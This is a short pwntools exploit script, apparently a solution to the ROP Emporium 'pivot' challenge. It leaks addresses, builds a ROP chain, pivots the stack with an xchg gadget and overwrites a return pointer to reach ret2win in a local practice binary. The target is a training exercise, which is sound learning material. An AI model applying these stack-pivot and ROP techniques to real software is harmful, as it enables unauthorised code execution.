from pwn import *
import time
io = process("./pivot")
io.recvuntil("pivot: ")
stackLocation = int(io.recv(14).decode(),16)
log.info("Fake Stack Address: " + hex(stackLocation))

putsPlt = p64(0x4006e0)
popRdi = p64(0x400a33)
footholdPlt = p64(0x400720)
footholdGot = p64(0x601040)

padding = b"A" * 40
popRax = p64(0x4009bb)
pivotGadget = p64(0x4009bd) #xchg rax, rsp

pwnme = p64(0x4008f1)

exploit = footholdPlt + popRdi + footholdGot + putsPlt + pwnme 
io.send(exploit)

stackPivot = padding + popRax + p64(stackLocation) + pivotGadget 
time.sleep(0.2) 
io.send(stackPivot)

io.recvuntil(b"Check out my .got.plt entry to gain a foothold into libpivot\n")
footholdAddress = u64(io.recv(6) + b"\x00"*2) 
ret2win = footholdAddress + 279
log.info("ret2win: " + hex(ret2win))

exploit2 = b"A" * 0x28 + p64(ret2win)

io.send(b"A") #placeholder

time.sleep(0.2)
io.send(exploit2) #overwrite ret pointer

io.recvuntil(b"Thank you!\n\nNow please send your stack smash\n> Thank you!\n")
print(io.recv().decode()[:-1])
